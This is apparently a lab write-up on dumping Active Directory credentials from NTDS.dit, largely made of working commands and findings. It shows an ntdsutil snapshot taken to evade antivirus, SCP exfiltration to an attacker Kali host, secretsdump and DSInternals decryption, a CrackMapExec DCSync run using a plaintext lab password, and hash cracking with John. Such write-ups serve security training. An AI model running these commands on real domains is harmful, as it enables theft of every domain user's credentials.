NTDS.DIT


Credential Dumping (NTDS.dit)

  1. 1.

    1. Hypothesis & Concept

Hypothesis: Since we have obtained Domain Admin privileges (via RBCD/S4U in the previous module), we have full control over the Domain Controller. We hypothesized that we could extract the NTDS.dit file, the database containing all Active Directory objects and password hashes.

Concept: The NTDS.dit file is constantly locked by the system while AD is running. To access it, we must bypass file locks.

  • Method A (Living off the Land): Use built-in Windows tools (ntdsutil) to create a snapshot (Install from Media / IFM) containing the database and the SYSTEM registry hive (needed to decrypt it).

  • Method B (PowerShell): Use the DSInternals module to parse the database locally on the DC.

  • Method C (DCSync): Use the Directory Replication Service Remote Protocol (DRSUAPI) to request hashes over the network without touching the disk.

  1. 2.

    2. Technique 1: Local Extraction (Ntdsutil & Impacket)

Objective: Create a copy of the Active Directory database using built-in tools to avoid detection by standard antivirus, exfiltrate it to Kali, and dump the secrets offline.

Step 1: Create IFM Snapshot (Windows)

Tool: ntdsutil.exe

Command:

ntdsutil.exe

"ac i ntds"

"ifm"

"create full C:\Temp"

 q q

Findings: ntdsutil successfully used the Volume Shadow Copy Service (VSS) to create a "snapshot" of the running database. It exported the ntds.dit file and the registry hives (SYSTEM/SECURITY) to C:\Temp.

Step 2: Exfiltration (SCP)

Objective: Transfer the dumped files to the attacker machine.

Command:

scp C:\temp.zip kali@

192.168

.

56.50

:/tmp/tmp.zip

Findings: The compressed snapshot was successfully transferred to the Kali Linux machine.

Step 3: Offline Dumping (Impacket)

Objective: Decrypt the NTDS.dit file using the SYSTEM hive.

Tool: impacket-secretsdump

Command:

impacket-secretsdump -ntds temp/Active\ Directory/ntds.dit -system temp/registry/SYSTEM LOCAL

Findings: The tool successfully extracted the Boot Key from the SYSTEM hive and decrypted the NTLM hashes for all domain users. We obtained the hashes for Administrator, krbtgt, itachi_anbu01, and the machine accounts.

  1. 3.

    3. Technique 2: Local Parsing (DSInternals)

Objective: Parse the NTDS.dit file directly on the Domain Controller using PowerShell, avoiding network transfers.

Step 1: Install & Load Module

Tool: DSInternals

Command:

Install-Module

-Name

 DSInternals

-Scope

 CurrentUser

Import-Module

DSInternals

Findings: The module was successfully installed from the PSGallery.

Step 2: Dump Account Hashes

Objective: Retrieve the BootKey and decrypt a specific account.

Command:

$key

=

Get-BootKey

-SystemHivePath

'C:\temp\registry\SYSTEM'

Get-ADDBAccount

-All

-DBPath

'C:\temp\Active Directory\ntds.dit'

-BootKey

$key

Findings: DSInternals successfully decrypted the database locally. The output displays the detailed properties for the Administrator account, including the NTLM Hash, LM Hash, and SID history.

  1. 4.

    4. Technique 3: Remote Dumping (DCSync)

Objective: Use the Directory Replication Service (DRSUAPI) to request hashes over the network, simulating the behavior of a Backup Domain Controller.

Tool: CrackMapExec (NetExec)

Command:

crackmapexec smb 192.168.56.10 -u itachi_anbu01 -p

'Amaterasu@777'

--ntds drsuapi

Findings: Using the credentials of a Domain Admin (itachi_anbu01), we successfully performed a DCSync attack. The Domain Controller replicated the password hashes to our attacker machine. We retrieved 26 NTDS hashes, including the krbtgt account.

  1. 5.

    5. Post-Exploitation: Cracking the Hashes

Objective: Convert the extracted NTLM hashes into plaintext passwords.

Tool: John the Ripper

Command:

john --format=NT

hash

--wordlist=anime_wordlist.txt

Findings: John successfully cracked the hash 10b3977c... revealing the password Infinity@SixEyes.
